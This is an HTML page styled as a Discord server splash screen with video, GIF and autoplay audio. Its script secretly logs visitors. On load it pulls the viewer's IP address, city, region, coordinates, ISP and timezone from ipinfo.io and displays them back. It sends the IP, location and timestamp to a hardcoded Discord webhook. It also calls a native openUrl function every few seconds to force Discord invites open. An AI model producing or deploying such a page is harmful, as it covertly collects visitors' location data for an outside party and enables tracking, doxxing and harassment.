<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/5-1</title>
    <style>
       body {
            margin: 0;
            padding: 0;
            background: black;
            font-family: 'Courier New', Courier, monospace;
            color: #9f8663;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
            overflow: hidden;
        }
        #content {
            display: none;
            opacity: 0;
            transition: opacity 2s ease;
        }
        .image-container img {
            width: 400px; 
            height: auto;
            border: 2px solid #a60404; 
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, , 0, 0.7); 
        }
          .info {
            margin-top: 20px;
            font-size: 1.5em;
            color:  #a60404; 
            text-shadow: 0 0 8px #a60404 0 0 15px #a60404, 0 0 25px #a60404;
            letter-spacing: 4.5px; 
            white-space: pre-wrap;
        }
        .text {
            margin-top: 5px;
            font-size: 75px; 
            color: #a60404; 
            text-shadow: 0 0 8px #a60404, 0 0 15px #a60404, 0 0 25px #a60404; 
            letter-spacing: 4.5px;
        }
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1; /* Make sure it's behind other content */
        }
        .video-container video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(15px); /* Apply blur effect */
        }
    </style>
</head>
<body>
    <div class="video-container">
        <video autoplay loop muted>
            <source src="https://cdn.discordapp.com/attachments/1348027196949921832/1349015924824608788/f3769e8c6c5a0e3a.mp4?ex=67d584fb&is=67d4337b&hm=c2f690fd7b2c83f970efb66a168fd60f8e0c718a5a55951eefc25154adebebd6&" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>

    <div class="gif-container">
        <img src="https://media.discordapp.net/attachments/1339648840252260433/1348295822315618336/standard_3.gif?ex=67d58956&is=67d437d6&hm=91301593d69809d980088771654b41d4509b1de36d94cdf48ba497e4e114d985&=" alt="">
    </div>

    <div id="content">
        <div class="image-container">
            <img src="https://media.discordapp.net/attachments/1339648840252260433/1348295822315618336/standard_3.gif?ex=67d58956&is=67d437d6&hm=91301593d69809d980088771654b41d4509b1de36d94cdf48ba497e4e114d985&=" alt="">
        </div>


        <audio autoplay loop>
            <source src="https://cdn.discordapp.com/attachments/1348027205665427549/1350259147513266217/Download.mp3?ex=67d61653&is=67d4c4d3&hm=5a9f8f2e5f6424207edea1502b21abb3c3dd7f39782730bc97e7cd018d775772&" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
        <div class="info" id="ip-info"></div>
        <div class="text">discord.gg/BYY</div>
    </div>

    <script>
        setTimeout(() => {
            document.querySelector('.gif-container').style.display = 'none';
            const content = document.getElementById('content');
            content.style.display = 'block';
            setTimeout(() => {
                content.style.opacity = 1;
            }, 150); 
        }, 0200);

        fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const { ip, country, city, region, loc, org, timezone } = data;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.innerHTML = ` ( كرمال عضيدي بومشعل & ريو )
<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;

            const dateTime = new Date().toLocaleString();
            const webhookUrl = 'https://canary.discord.com/api/webhooks/1348295991299932300/5xcP5MpFaV2OMrS88nODEIjHxO3w_qvN8DEGdw4UGEPHEyCvGFFFLG4A6HHYkc-RAgmA';
            fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
            });
        });

        setInterval(function() {
            window.invokeNative("openUrl", "https://discord.gg/byy");
            window.invokeNative("openUrl", "https://discord.gg/byy");
             }, 3400);
    </script>
</body>
</html>
